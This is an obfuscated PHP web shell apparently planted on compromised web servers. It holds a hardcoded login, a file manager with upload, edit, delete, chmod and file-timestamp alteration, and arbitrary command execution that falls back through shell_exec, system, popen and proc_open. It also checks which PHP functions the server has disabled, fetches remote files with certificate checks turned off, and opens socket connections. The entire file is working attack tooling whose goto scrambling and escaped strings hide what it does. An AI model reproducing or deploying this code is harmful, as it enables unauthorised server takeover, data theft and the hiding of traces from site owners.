<?php
 goto wFs6L; urpqj: if (!function_exists("\146\x78\x5f\163\x68\x6f\167\137\163\157\165\x72\143\145")) { function fx_show_source($file, $return = false) { if (is_fn_usable("\163\x68\x6f\167\x5f\163\x6f\165\162\x63\x65")) { return @show_source($file, $return); } if (is_fn_usable("\150\x69\x67\x68\x6c\151\147\x68\x74\137\x66\x69\154\145")) { return @highlight_file($file, $return); } $c = @file_get_contents($file); if ($return) { return $c; } echo $c; return true; } } goto veoqD; LC_eS: if (!function_exists("\146\x78\x5f\151\x6e\151\x5f\162\145\x73\164\x6f\162\x65")) { function fx_ini_restore($varname) { if (is_fn_usable("\151\156\x69\x5f\162\145\163\164\157\162\x65")) { return @ini_restore($varname); } return false; } } goto PZjs3; MrIFM: echo rawurlencode($current); goto gLFD0; IeZsh: function permsToString($f) { $p = @fileperms($f); if ($p === false) { return "\77\x3f\x3f\x3f\x3f\x3f\77\x3f\77\x3f"; } $t = $p & 16384 ? "\x64" : ($p & 40960 ? "\154" : "\x2d"); $s = ($p & 256 ? "\162" : "\55") . ($p & 128 ? "\167" : "\55") . ($p & 64 ? "\170" : "\x2d"); $s .= ($p & 32 ? "\x72" : "\55") . ($p & 16 ? "\x77" : "\55") . ($p & 8 ? "\x78" : "\55"); $s .= ($p & 4 ? "\x72" : "\x2d") . ($p & 2 ? "\x77" : "\x2d") . ($p & 1 ? "\170" : "\55"); return $t . $s; } goto KHHxO; kGMg3: echo h($csrf); goto Slmh2; U1vpf: echo rawurlencode($current); goto GWxiW; GVSML: if (!function_exists("\151\x73\137\x66\x6e\x5f\x75\x73\141\142\x6c\145")) { function is_fn_usable($fn) { if (!function_exists($fn)) { return false; } $disabled = (string) @ini_get("\x64\151\x73\x61\142\x6c\x65\137\146\x75\x6e\x63\x74\151\x6f\156\163"); $suhosin = (string) @ini_get("\163\x75\150\x6f\x73\151\156\x2e\145\x78\145\x63\165\x74\157\162\56\146\165\x6e\143\56\x62\154\x61\143\x6b\154\151\163\164"); $blocked = array(); if ($disabled !== '') { $blocked = array_merge($blocked, array_map("\164\162\151\155", explode("\x2c", $disabled))); } if ($suhosin !== '') { $blocked = array_merge($blocked, array_map("\164\x72\151\x6d", explode("\x2c", $suhosin))); } $blocked = array_filter(array_map("\163\x74\162\164\157\x6c\157\167\x65\x72", $blocked)); return !in_array(strtolower($fn), $blocked, true); } } goto N1PbU; DfBUG: ?>
" class="space-y-2">
            <input type="hidden" name="csrf" value="<?php  goto Xmp7c; tSKAh: foreach ($dirs as $name) { $full = $current . DIRECTORY_SEPARATOR . $name; $r = @is_readable($full); $w = @is_writable($full); $permColorClass = $w ? "\x74\145\x78\x74\x2d\154\151\x6d\x65\55\64\x30\60" : ($r ? "\164\x65\x78\164\55\x77\150\x69\164\x65" : "\164\145\x78\164\x2d\x72\x65\144\x2d\64\60\60"); ?>
                  <tr class="border-b border-slate-800 hoverable"
                      data-type="dir"
                      data-name="<?php  echo h(strtolower($name)); ?>
"
                      data-size="0"
                      data-mtime="<?php  echo (int) @filemtime($full); ?>
"
                      draggable="true"
                      ondragstart="onDragStartItem(event, <?php  echo je($name); ?>
)"
                      ondragover="onDragOverDir(event)"
                      ondragleave="onDragLeaveDir(event)"
                      ondrop="onDropToDir(event, <?php  echo je($name); ?>
)">
                    <td class="py-2 px-2"><input class="rowchk" type="checkbox" name="items[]" value="<?php  echo h($name); ?>
"></td>
                    <td class="py-2 px-2">
                      <div class="flex items-center gap-2 <?php  echo $permColorClass; ?>
">
                        <?php  echo iconSvgFor($full); ?>
                        <a class="hover:underline font-medium text-white"
                           draggable="false"
                           onclick="return guardLinkCopy(event)"
                           href="?p=<?php  echo rawurlencode($full); ?>
"><?php  echo h($name); ?>
</a>
                        <span class="badge-small">DIR</span>
                      </div>
                    </td>
                    <td class="py-2 px-2">-</td>
                    <td class="py-2 px-2 mono <?php  echo $permColorClass; ?>
"><?php  echo h(permsToString($full)); ?>
</td>
                    <td class="py-2 px-2"><?php  echo h(date("\131\55\x6d\x2d\144\40\110\x3a\151\x3a\163", @filemtime($full) ?: time())); ?>
</td>
                    <td class="py-2 px-2">
                      <div class="row-actions">
                        <span class="btn btn-xs btnw" style="opacity:.35; pointer-events:none;">Edit</span>
                        <span class="btn btn-xs btnw" style="opacity:.35; pointer-events:none;">Download</span>

                        <button type="button" class="btn btn-xs btnw" onclick="toggleRow('rn-<?php  echo h($name); ?>
')">Rename</button>
                        <button type="button" class="btn btn-xs btnw" onclick="toggleRow('cm-<?php  echo h($name); ?>
')">Chmod</button>
                        <button type="button" class="btn btn-xs btnw" onclick="toggleRow('mt-<?php  echo h($name); ?>
')">Change Date</button>

                        <form method="post" action="?a=delete&p=<?php  echo rawurlencode($current); ?>
" onsubmit="return confirm('Delete this directory (recursive)?')" class="inline">
                          <input type="hidden" name="csrf" value="<?php  echo h($csrf); ?>
">
                          <input type="hidden" name="target" value="<?php  echo h($name); ?>
">
                          <button class="btn btn-xs btnw" type="submit">Delete</button>
                        </form>
                      </div>

                      <div id="rn-<?php  echo h($name); ?>
" class="hidden mt-2">
                        <form method="post" action="?a=rename&p=<?php  echo rawurlencode($current); ?>
" class="flex flex-wrap gap-2">
                          <input type="hidden" name="csrf" value="<?php  echo h($csrf); ?>
">
                          <input type="hidden" name="old" value="<?php  echo h($name); ?>
">
                          <input type="text" name="new" class="field w-48" placeholder="New name">
                          <button class="btn btn-sm btnw" type="submit">OK</button>
                          <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                        </form>
                      </div>

                      <div id="cm-<?php  echo h($name); ?>
" class="hidden mt-2">
                        <form method="post" action="?a=chmod&p=<?php  echo rawurlencode($current); ?>
" class="flex flex-wrap gap-2 items-center">
                          <input type="hidden" name="csrf" value="<?php  echo h($csrf); ?>
">
                          <input type="hidden" name="target" value="<?php  echo h($name); ?>
">
                          <input type="text" name="mode" class="field w-28 mono" placeholder="0755">
                          <label class="text-xs flex items-center gap-1"><input type="checkbox" name="recursive"> recursive</label>
                          <button class="btn btn-sm btnw" type="submit">OK</button>
                          <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                        </form>
                      </div>

                      <div id="mt-<?php  echo h($name); ?>
" class="hidden mt-2">
                        <form method="post" action="?a=mtime&p=<?php  echo rawurlencode($current); ?>
" class="flex flex-wrap gap-2 items-center">
                          <input type="hidden" name="csrf" value="<?php  echo h($csrf); ?>
">
                          <input type="hidden" name="target" value="<?php  echo h($name); ?>
">
                          <input type="text" name="ts" class="field w-56 mono" placeholder="YYYY-MM-DD HH:MM:SS or epoch" required>
                          <label class="text-xs flex items-center gap-1"><input type="checkbox" name="recursive" checked> recursive</label>
                          <button class="btn btn-sm btnw" type="submit">OK</button>
                          <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                        </form>
                      </div>
                    </td>
                  </tr>
                <?php  } goto Keaqh; FSgnU: echo h($current); goto r94NG; VoqtF: echo je($current); goto b7Bql; OIopH: if (!function_exists("\146\145\x74\x63\x68\x55\x72\154\124\157\x46\151\x6c\x65")) { function fetchUrlToFile($url, $dest) { $errs = array(); if (is_fn_usable("\x63\165\162\154\137\x69\x6e\x69\x74")) { $ch = @curl_init($url); $fp = @fopen($dest, "\x77\142"); if ($ch && $fp) { @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); @curl_setopt($ch, CURLOPT_FILE, $fp); @curl_setopt($ch, CURLOPT_FAILONERROR, true); @curl_setopt($ch, CURLOPT_USERAGENT, "\115\x6f\x7a\x69\154\154\x61\57\x35\x2e\60"); @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); @curl_setopt($ch, CURLOPT_TIMEOUT, 60); $ok = @curl_exec($ch); $e = @curl_error($ch); @curl_close($ch); @fclose($fp); if ($ok) { return array(true, null); } $errs[] = "\x63\125\x52\x4c\72\x20" . $e; @unlink($dest); } else { if ($ch) { @curl_close($ch); } if ($fp) { @fclose($fp); } $errs[] = "\151\156\x69\x74\x20\143\125\x52\x4c\57\146\x6f\160\145\156"; } } $ctx = @stream_context_create(array("\x68\164\164\x70" => array("\x66\x6f\x6c\x6c\x6f\167\x5f\x6c\157\x63\141\164\x69\x6f\x6e" => 1, "\164\151\x6d\145\157\165\x74" => 60, "\150\x65\141\144\145\162" => "\125\163\x65\162\55\101\147\x65\156\164\x3a\40\x4d\157\172\151\154\x6c\141\57\65\x2e\x30\xd\xa"), "\x73\x73\x6c" => array("\166\145\x72\151\146\171\137\160\x65\x65\x72" => false, "\x76\145\162\x69\x66\171\137\160\145\145\x72\x5f\x6e\x61\x6d\145" => false))); if (@copy($url, $dest, $ctx)) { return array(true, null); } $errs[] = "\143\x6f\x70\171\50\x75\x72\x6c\x29"; $d = @file_get_contents($url, false, $ctx); if ($d !== false && @file_put_contents($dest, $d) !== false) { return array(true, null); } $errs[] = "\x67\145\x74\53\x70\x75\164"; $in = @fopen($url, "\x72\142", false, $ctx); $out = @fopen($dest, "\167\x62"); if ($in && $out) { $c = @stream_copy_to_stream($in, $out); @fclose($in); @fclose($out); if ($c !== false) { return array(true, null); } $errs[] = "\163\x74\162\x65\x61\155\x5f\143\157\160\171"; @unlink($dest); } else { $errs[] = "\146\x6f\x70\x65\x6e\50\165\x72\x6c\57\144\x65\163\164\51"; } return array(false, implode("\x3b\40", $errs) . "\40\x66\x61\151\154\x65\144"); } } goto UWsJj; fgih6: echo h($csrf); goto Nhs_i; v8jSp: function create_nonzero_file($path, $userContent = null) { $default = "\x43\162\145\141\164\x65\x64\40\x62\171\x20\112\101\113\101\122\124\101\x4e\x53\x20\124\x45\101\115\x20\100\x20" . date("\143") . "\12"; $payload = (string) ($userContent !== null ? $userContent : $default); if ($payload === '') { $payload = $default; } $w = @file_put_contents($path, $payload, LOCK_EX); if ($w !== false && $w > 0) { return array(true, "\146\151\x6c\145\x5f\x70\165\x74\137\x63\x6f\156\x74\x65\x6e\x74\x73"); } $fp = @fopen($path, "\167\142"); if ($fp) { $wr = @fwrite($fp, $payload); @fclose($fp); if ($wr !== false && $wr > 0) { return array(true, "\x66\157\x70\x65\x6e\53\146\167\x72\151\164\145"); } } $tmp = @tempnam(sys_get_temp_dir(), "\142\x6c\165\x65\x5f"); if ($tmp) { @file_put_contents($tmp, $payload); if (@rename($tmp, $path)) { if (@filesize($path) > 0) { return array(true, "\164\145\155\160\156\141\155\x2b\x72\145\156\141\155\145"); } } elseif (@copy($tmp, $path)) { @unlink($tmp); if (@filesize($path) > 0) { return array(true, "\164\x65\155\160\156\x61\155\53\143\x6f\160\x79"); } } @unlink($tmp); } $src = @fopen("\160\150\x70\72\x2f\57\164\145\155\x70", "\x77\x62\x2b"); if ($src) { @fwrite($src, $payload); @rewind($src); $dst = @fopen($path, "\167\142"); if ($dst) { $copied = @stream_copy_to_stream($src, $dst); @fclose($dst); if ($copied !== false && $copied > 0) { @fclose($src); return array(true, "\160\150\x70\72\x2f\57\x74\145\x6d\x70\40\x63\157\x70\171"); } } @fclose($src); } if (@touch($path)) { $w2 = @file_put_contents($path, $payload, FILE_APPEND); if ($w2 !== false && $w2 > 0) { return array(true, "\164\x6f\165\x63\x68\x2b\x61\x70\x70\x65\156\144"); } } return array(false, "\x41\154\x6c\40\155\145\164\x68\157\x64\163\x20\x66\x61\x69\154\145\144"); } goto MNbK2; b7Bql: ?>
;

    ['dragenter','dragover'].forEach(function(ev){
      document.addEventListener(ev, function(e){ e.preventDefault(); e.stopPropagation(); tableCard.classList.add('drop-hint'); });
    });
    ['dragleave','drop'].forEach(function(ev){
      document.addEventListener(ev, function(e){
        if(ev==='dragleave' && e.target !== document) return;
        tableCard.classList.remove('drop-hint');
      });
    });
    document.addEventListener('drop', function(e){
      if(!e.dataTransfer || !e.dataTransfer.files || e.dataTransfer.files.length===0) return;
      e.preventDefault(); e.stopPropagation();
      try{
        var fd = new FormData();
        fd.append('csrf', csrf);
        for(var i=0;i<e.dataTransfer.files.length;i++){ var f=e.dataTransfer.files[i]; fd.append('files[]', f, f.name); }
        fetch('?a=upload&p='+encodeURIComponent(currentPath), { method:'POST', body:fd })
          .then(function(){ location.href='?p='+encodeURIComponent(currentPath); })
          .catch(function(){ alert('Upload failed'); });
      }catch(err){ console.error(err); alert('Upload failed'); }
    });

    // ===== Drag to Move between directories (copy-friendly by default) =====
    var draggedItemName = null;
    var dragEnabled = false; // DEFAULT OFF → tabel mudah di-copy

    // Toggle handler
    (function(){
      var dt = document.getElementById('dragToggle');
      if (dt) {
        dragEnabled = !!dt.checked;
        dt.addEventListener('change', function(){
          dragEnabled = !!dt.checked;
        });
      }
    })();

    function onDragStartItem(ev, name){
      if (!dragEnabled) {
        ev.preventDefault();
        return false;
      }
      draggedItemName = name; ev.dataTransfer.setData('text/plain', name);
      ev.dataTransfer.effectAllowed = 'move';
    }
    function onDragOverDir(ev){
      if (!dragEnabled) return;
      ev.preventDefault(); ev.currentTarget.classList.add('droptarget');
      ev.dataTransfer.dropEffect = 'move';
    }
    function onDragLeaveDir(ev){
      ev.currentTarget.classList.remove('droptarget');
    }
    function onDropToDir(ev, dirName){
      if (!dragEnabled) return;
      ev.preventDefault();
      var row = ev.currentTarget; row.classList.remove('droptarget');
      var src = draggedItemName || ev.dataTransfer.getData('text/plain');
      if(!src) return;
      try{
        var fd = new FormData();
        fd.append('csrf', csrf);
        fd.append('src', src);
        var dstAbs = <?php  goto Etyhb; uPjQ3: ?>
">
          <label class="text-sm text-slate-300">New File</label>
          <input type="text" name="name" class="field mono" placeholder="newfile.txt" required>
          <textarea name="content" class="field mono" rows="2" placeholder="(Optional) initial content; jika kosong akan diisi timestamp otomatis"></textarea>
          <button class="btn w-full" type="submit">Create File</button>
          <div class="text-xs text-slate-400">Dibuat non-0 byte dengan beberapa fallback (lintas versi PHP).</div>
        </form>

        <hr class="my-3 border-slate-700">

        <form method="post" action="?a=new-dir&p=<?php  goto cfMyM; YknJq: if (!function_exists("\x66\170\137\163\150\x65\x6c\x6c\137\145\170\x65\143")) { function fx_shell_exec($cmd) { if (is_fn_usable("\163\x68\145\154\x6c\137\x65\170\145\143")) { return @shell_exec($cmd); } return null; } } goto DNar4; GWxiW: ?>
" class="space-y-2">
            <input type="hidden" name="csrf" value="<?php  goto O1J1h; aXlku: ?>
" class="ml-1 shrink-0">
        <input type="hidden" name="csrf" value="<?php  goto R_9Ff; AUNSw: function biru_apply_chmod($path, $mode, $recursive, &$ok) { if (!@chmod($path, $mode)) { $ok = false; } if ($recursive && is_dir($path)) { $h = @opendir($path); if ($h !== false) { while (false !== ($v = readdir($h))) { if ($v === "\x2e" || $v === "\56\x2e") { continue; } biru_apply_chmod($path . DIRECTORY_SEPARATOR . $v, $mode, true, $ok); } closedir($h); } else { $ok = false; } } } goto dVpY2; sQrHN: header("\x50\162\141\x67\x6d\x61\x3a\40\156\157\55\x63\141\x63\150\145"); goto su_zk; WxXmZ: ?>
;
      var info = (filename && CodeMirror.findModeByFileName(filename)) || CodeMirror.findModeByMIME('text/plain');

      var textValue = pre.textContent || '';
      var holder = document.createElement('div');
      pre.parentNode.replaceChild(holder, pre);

      var cmPrev = CodeMirror(holder, {
        value: textValue,
        readOnly: true,
        lineNumbers: true,
        lineWrapping: true,
        theme: 'material-darker',
        mode: (info && info.mime) ? info.mime : 'text/plain',
        viewportMargin: Infinity
      });

      if (info && info.mode) CodeMirror.autoLoadMode(cmPrev, info.mode);
      cmPrev.setSize('100%', 480);

      var det = document.getElementById('previewPanel');
      if (det) det.addEventListener('toggle', function(){ setTimeout(function(){ cmPrev.refresh(); }, 50); });
      window.addEventListener('resize', function(){ cmPrev.refresh(); });
    })();

    // ===== CodeMirror untuk RUN COMMAND (single-line + placeholder) =====
    (function(){
      var ta = document.getElementById('cmdTA');
      if(!ta || typeof CodeMirror === 'undefined') return;

      CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
      var isWin = <?php  goto dowKA; AiLKZ: echo count($files); goto HByfz; xsyKy: $current = isset($_GET["\160"]) ? (string) $_GET["\160"] : getcwd(); goto jDpVq; T0pT_: if (empty($_SESSION["\x63\163\x72\x66"])) { $_SESSION["\x63\163\x72\x66"] = bin2hex(biru_random_bytes(16)); } goto pM2SE; UVriR: session_start(); goto T0pT_; BESiR: $files = array(); goto X8WKC; PXtGT: define("\101\x55\124\110\x5f\120\x41\123\123\x5f\110\x41\123\x48", "\x24\x32\141\44\61\x32\x24\x6a\165\105\x64\112\151\x6f\x45\171\x36\163\125\147\x47\66\x70\154\102\117\x62\x53\117\x46\111\61\147\x44\131\x69\x65\x6d\x73\167\x55\x7a\x49\x61\x4b\122\x58\152\x75\x2e\x79\153\145\x6c\112\x35\104\x57\x6a\103"); goto oXFTW; wIVzk: ?>
</div>
        </div>
      </div>

      <div class="hidden md:flex items-center gap-2 rounded-xl border border-slate-700 bg-slate-900/60 px-2 py-1 shrink-0">
        <?php  goto IALfT; YFgbk: function addDirToZip($zip, $dir, $local) { $dir = rtrim($dir, DIRECTORY_SEPARATOR); if (method_exists($zip, "\141\x64\144\105\x6d\160\164\171\x44\x69\x72")) { $zip->addEmptyDir($local); } $h = @opendir($dir); if (!$h) { return; } while (false !== ($e = readdir($h))) { if ($e === "\56" || $e === "\x2e\56") { continue; } $full = $dir . DIRECTORY_SEPARATOR . $e; $localPath = $local . "\57" . basename($e); if (is_dir($full)) { addDirToZip($zip, $full, $localPath); } elseif (is_file($full) && method_exists($zip, "\141\144\144\106\x69\154\x65")) { $zip->addFile($full, $localPath); } } closedir($h); } goto QgjJ8; mOAsE: if (!function_exists("\x66\170\137\163\x74\x72\145\141\155\x5f\x73\x6f\143\153\x65\x74\137\143\x6c\151\x65\x6e\x74")) { function fx_stream_socket_client($remote_socket, &$errno = null, &$errstr = null, $timeout = 30, $flags = 0, $context = null) { if (is_fn_usable("\163\164\x72\145\141\155\137\x73\157\143\x6b\145\164\137\143\x6c\x69\145\156\164")) { return @stream_socket_client($remote_socket, $errno, $errstr, $timeout, $flags, $context); } if (is_fn_usable("\146\163\157\143\x6b\x6f\x70\145\156")) { $host = $remote_socket; $port = 0; if (stripos($remote_socket, "\x74\143\160\x3a\57\57") === 0 || stripos($remote_socket, "\163\x73\x6c\72\57\x2f") === 0 || stripos($remote_socket, "\164\154\x73\x3a\57\57") === 0) { $tmp = parse_url($remote_socket); if ($tmp && isset($tmp["\x68\157\x73\164"]) && isset($tmp["\160\157\162\x74"])) { $host = $tmp["\150\x6f\x73\x74"]; $port = $tmp["\x70\x6f\x72\x74"]; } } else { if (strpos($remote_socket, "\x3a") !== false) { $parts = explode("\x3a", $remote_socket, 2); $host = $parts[0]; $port = (int) $parts[1]; } } return @fsockopen($host, $port ? $port : 80, $errno, $errstr, $timeout); } $errno = 0; $errstr = "\x4e\157\40\163\157\143\153\145\x74\x20\146\x75\156\143\164\151\x6f\156\163\40\x61\166\141\x69\154\x61\142\154\x65"; return false; } } goto LC_eS; rn7uZ: if (!function_exists("\x66\170\x5f\x66\x69\154\x65\x67\x72\x6f\165\160")) { function fx_filegroup($filename) { if (is_fn_usable("\x66\151\154\x65\x67\x72\x6f\x75\160")) { return @filegroup($filename); } return false; } } goto r7Nv3; OHa91: if (!function_exists("\162\165\156\137\167\x69\164\x68\x5f\x73\171\163\164\x65\x6d")) { function run_with_system($cmd, $cwd = null) { if (!is_fn_usable("\163\171\163\x74\145\x6d")) { return null; } $full = make_cd_prefix($cwd) . $cmd . "\x20\x32\76\46\61"; ob_start(); @system($full, $code); $out = ob_get_clean(); return array("\x6d\x65\164\x68\157\x64" => "\163\x79\x73\x74\x65\x6d", "\x63\x6f\144\145" => $code, "\x6f\165\164" => $out); } } goto IbEjo; FXcsC: $viewMode = in_array($modeParam, array("\164\170\164", "\x62\66\64", "\x61\165\x74\x6f"), true) ? $modeParam : "\141\x75\x74\x6f"; goto iuKLc; cj4qH: $items = listDirEntries($current); goto BESiR; N1PbU: function biru_random_bytes($len) { if (is_fn_usable("\x72\141\x6e\144\157\x6d\137\x62\x79\x74\145\x73")) { return random_bytes($len); } if (is_fn_usable("\x6f\160\x65\x6e\x73\163\154\x5f\x72\x61\x6e\x64\x6f\155\137\160\x73\145\165\x64\x6f\137\142\171\x74\x65\163")) { $strong = false; $b = openssl_random_pseudo_bytes($len, $strong); if ($b !== false && $strong) { return $b; } } $out = ''; for ($i = 0; $i < $len; $i++) { $out .= chr(mt_rand(0, 255)); } return $out; } goto ODNXP; yWorW: ?>
        <input id="searchBox" type="search" placeholder="Filter by name (Ctrl+/)" class="bg-transparent text-sm outline-none placeholder:text-slate-500 w-64" oninput="filterRows()">
      </div>

      <div class="text-sm text-slate-300 hidden lg:block truncate">
        Path: <span class="mono"><?php  goto qU4t_; Zf5ZS: ?>
</span>
      </div>

      <!-- Command (dibatasi lebar) -->
      <div class="cmd-container ml-auto">
        <form method="post" action="?a=cmd&p=<?php  goto MrIFM; h9Egf: function verify_login_creds($u, $p) { if ($u !== AUTH_USER) { return false; } $hash = AUTH_PASS_HASH; if ($hash === '' || strlen($hash) < 20) { return false; } return biru_password_verify($p, $hash); } goto BrREE; qH3X3: if (!empty($_SESSION["\155\163\147"])) { ?>
        <div class="rounded-xl border border-blue-900/60 bg-blue-900/20 text-blue-100 px-4 py-3">
          <?php  echo h($_SESSION["\x6d\163\147"]); unset($_SESSION["\155\x73\147"]); ?>
        </div>
      <?php  } goto vXSkl; dV8y3: echo h($csrf); goto uPjQ3; zmV92: echo rawurlencode($current); goto MRWSw; igoc0: $isEdit = (isset($_GET["\141"]) ? $_GET["\141"] : '') === "\145\144\151\164" && isset($_GET["\x66"]) ? safeJoin($current, $_GET["\146"]) : null; goto SKl3f; Xmp7c: echo h($csrf); goto C61wq; cfMyM: echo rawurlencode($current); goto Mvu4a; QC4cr: echo rawurlencode($current); goto DfBUG; kEA_i: if ($action === "\x64\x6f\167\156\154\157\141\x64") { $f = safeJoin($current, isset($_GET["\x66"]) ? $_GET["\146"] : ''); if (!is_file($f) || !is_readable($f)) { http_response_code(404); die("\116\157\164\x20\146\157\x75\156\144"); } header("\103\x6f\156\x74\x65\x6e\x74\x2d\104\x65\163\143\162\x69\x70\x74\151\x6f\156\x3a\x20\106\151\154\145\x20\x54\x72\x61\156\x73\146\145\162"); header("\x43\157\x6e\164\x65\156\164\55\124\171\160\x65\x3a\40\141\160\x70\154\151\x63\x61\x74\x69\157\156\x2f\x6f\x63\x74\x65\x74\x2d\x73\x74\162\145\141\x6d"); header("\x43\x6f\156\164\x65\156\164\55\104\x69\163\x70\x6f\x73\x69\x74\151\157\x6e\72\x20\141\164\164\x61\143\150\155\145\x6e\164\x3b\40\146\x69\x6c\x65\156\141\x6d\x65\75\x22" . basename($f) . "\x22"); header("\103\157\x6e\x74\145\156\x74\55\x4c\x65\x6e\x67\x74\x68\x3a\40" . filesize($f)); header("\x58\55\103\x6f\156\164\x65\156\x74\55\x54\x79\x70\145\x2d\x4f\160\x74\151\x6f\156\x73\x3a\x20\156\157\163\156\151\x66\146"); readfile($f); die; } goto l6XpL; iiWbF: function biru_password_verify($password, $hash) { if (is_fn_usable("\160\141\x73\x73\x77\157\162\144\x5f\166\145\x72\151\146\x79")) { return password_verify($password, $hash); } if (strlen($hash) >= 60 && $hash[0] . $hash[1] === "\x24\62") { return crypt($password, $hash) === $hash; } return false; } goto h9Egf; IALfT: echo svgIcon("\x73\x65\141\162\143\150", "\x69\143\x6f"); goto yWorW; l6XpL: if ($action === "\162\141\x77") { $f = safeJoin($current, isset($_GET["\x66"]) ? $_GET["\146"] : ''); if (!is_file($f) || !is_readable($f)) { http_response_code(404); die("\x4e\157\164\x20\x66\157\x75\156\x64"); } $mime = "\141\160\160\x6c\151\143\141\164\x69\157\156\57\157\x63\164\x65\164\x2d\163\x74\162\145\141\155"; if (is_fn_usable("\x66\151\x6e\146\x6f\137\x6f\x70\x65\156")) { $fi = @finfo_open(FILEINFO_MIME_TYPE); if ($fi) { $det = @finfo_file($fi, $f); if ($det) { $mime = $det; } @finfo_close($fi); } } elseif (is_fn_usable("\x6d\x69\x6d\x65\x5f\x63\157\156\164\x65\x6e\x74\137\164\171\160\x65")) { $tmp = @mime_content_type($f); if ($tmp) { $mime = $tmp; } } header("\103\157\156\164\145\x6e\164\x2d\124\x79\160\x65\x3a\40" . $mime); header("\x43\157\x6e\x74\145\156\164\x2d\x4c\x65\x6e\147\164\150\72\40" . filesize($f)); header("\130\x2d\x43\x6f\x6e\164\145\x6e\164\55\124\x79\x70\x65\55\x4f\x70\x74\x69\157\x6e\163\x3a\40\156\157\163\156\x69\x66\x66"); header("\x43\x6f\156\164\145\156\164\55\x44\x69\163\160\x6f\163\x69\x74\x69\157\156\72\x20\151\156\154\x69\x6e\145\x3b\x20\x66\151\x6c\145\x6e\x61\x6d\x65\x3d\x22" . basename($f) . "\42"); readfile($f); die; } goto FxZxV; mWs4c: if (!function_exists("\x66\x78\x5f\x70\x6f\160\x65\x6e")) { function fx_popen($cmd, $mode) { if (is_fn_usable("\x70\x6f\160\x65\156")) { return @popen($cmd, $mode); } return false; } } goto fyKJc; rgmwF: $action = isset($_GET["\x61"]) ? $_GET["\x61"] : ''; goto vYo19; rdFZp: if ($hasNatural) { sort($dirs, $hasFlagCase ? SORT_NATURAL | SORT_FLAG_CASE : SORT_NATURAL); sort($files, $hasFlagCase ? SORT_NATURAL | SORT_FLAG_CASE : SORT_NATURAL); } else { natcasesort($dirs); $dirs = array_values($dirs); natcasesort($files); $files = array_values($files); } goto CZsGw; U0TMe: ?>
">
        <button class="btn btn-sm" type="submit">Logout</button>
      </form>
    </div>
  </header>

  <main class="w-full px-6 py-4 grid grid-cols-12 gap-4">

    <?php  goto rBGUr; r94NG: ?>
">
          <div class="flex gap-2">
            <button class="btn btnw" type="submit">Go</button>
            <a class="btn btnw" href="?">Go to CWD</a>
          </div>
        </form>
      </section>

      <!-- CREATE: New File / New Folder -->
      <section class="card p-4">
        <h2 class="font-medium mb-3">Create</h2>

        <form method="post" action="?a=new-file&p=<?php  goto XH2s0; ohMiy: function listDirEntries($dir) { $h = @opendir($dir); if ($h === false) { return array(); } $items = array(); while (false !== ($e = readdir($h))) { if ($e === "\56" || $e === "\56\x2e") { continue; } $items[] = $e; } closedir($h); return $items; } goto TyjIt; dkEWX: if (!function_exists("\162\x75\x6e\137\x63\x6f\x6d\x6d\141\x6e\144\137\x61\154\154")) { function run_command_all($cmd, $cwd = null) { $po = run_with_proc_open($cmd, $cwd, 30); if ($po) { return $po; } $order = array("\162\165\x6e\137\167\x69\164\150\137\x73\150\x65\x6c\x6c\137\145\170\145\143", "\x72\165\156\x5f\167\x69\x74\x68\x5f\145\170\x65\x63", "\162\165\x6e\137\x77\x69\x74\150\x5f\x73\171\163\x74\x65\155", "\x72\165\156\137\167\x69\164\x68\137\x70\x6f\160\145\x6e"); foreach ($order as $fn) { if (function_exists($fn)) { $res = $fn($cmd, $cwd); if ($res) { return $res; } } } return array("\155\145\x74\150\157\x64" => "\156\x6f\x6e\145", "\143\157\144\x65" => 127, "\157\x75\x74" => "\x43\x6f\155\155\x61\156\144\x20\162\x75\x6e\156\x65\x72\40\156\157\164\x20\x61\166\141\151\154\x61\x62\x6c\x65\40\x6f\156\40\164\x68\151\x73\x20\120\x48\120\40\142\165\151\154\144\56"); } } goto AUNSw; veoqD: if (!function_exists("\146\170\x5f\x73\143\x61\156\144\151\162")) { function fx_scandir($dir) { if (is_fn_usable("\x73\143\141\156\144\151\162")) { return @scandir($dir); } $h = @opendir($dir); if (!$h) { return false; } $out = array(); while (false !== ($e = readdir($h))) { $out[] = $e; } closedir($h); return $out; } } goto cVLar; SadVZ: if (!function_exists("\146\x78\137\x70\157\163\x69\170\137\147\145\164\147\162\x67\151\x64")) { function fx_posix_getgrgid($gid) { if (is_fn_usable("\x70\x6f\163\x69\170\137\147\145\164\x67\162\x67\151\144")) { return @posix_getgrgid($gid); } return array("\156\141\x6d\145" => "\x75\156\x6b\156\157\x77\156", "\147\151\x64" => $gid); } } goto TJv1z; sTY8g: function ensureCsrf() { if ($_SERVER["\122\x45\121\x55\105\x53\x54\137\x4d\x45\124\x48\117\x44"] === "\120\x4f\x53\124") { $sess = isset($_SESSION["\x63\163\x72\x66"]) ? $_SESSION["\143\x73\162\146"] : ''; $tok = isset($_POST["\x63\163\162\146"]) ? (string) $_POST["\x63\163\162\x66"] : ''; $ok = hash_equals($sess, $tok); if (!$ok) { http_response_code(400); die("\x43\123\122\106\40\x74\157\x6b\x65\156\x20\x69\x6e\166\141\154\151\x64"); } } } goto v8jSp; fyKJc: if (!function_exists("\x66\x78\x5f\160\141\162\163\145\x5f\151\156\151\x5f\x66\x69\154\x65")) { function fx_parse_ini_file($filename, $process_sections = false, $scanner_mode = null) { if (is_fn_usable("\x70\141\162\x73\145\137\151\x6e\x69\x5f\146\151\154\145")) { if ($scanner_mode === null) { return @parse_ini_file($filename, $process_sections); } return @parse_ini_file($filename, $process_sections, $scanner_mode); } $s = @file_get_contents($filename); if ($s === false) { return false; } if (is_fn_usable("\x70\141\x72\163\145\137\151\x6e\x69\x5f\163\164\x72\151\156\x67")) { return @parse_ini_string($s, $process_sections); } return false; } } goto urpqj; jDpVq: if (!is_dir($current)) { $current = getcwd(); } goto j0Br0; UGcrm: define("\x41\125\x54\x48\137\125\x53\105\122", "\x68\x61\154\x6f\x62\157\171\172"); goto PXtGT; oXFTW: function h($s) { return htmlspecialchars($s, ENT_QUOTES, "\x55\x54\x46\x2d\x38"); } goto LeluV; dmI_M: ?>
" class="space-y-2">
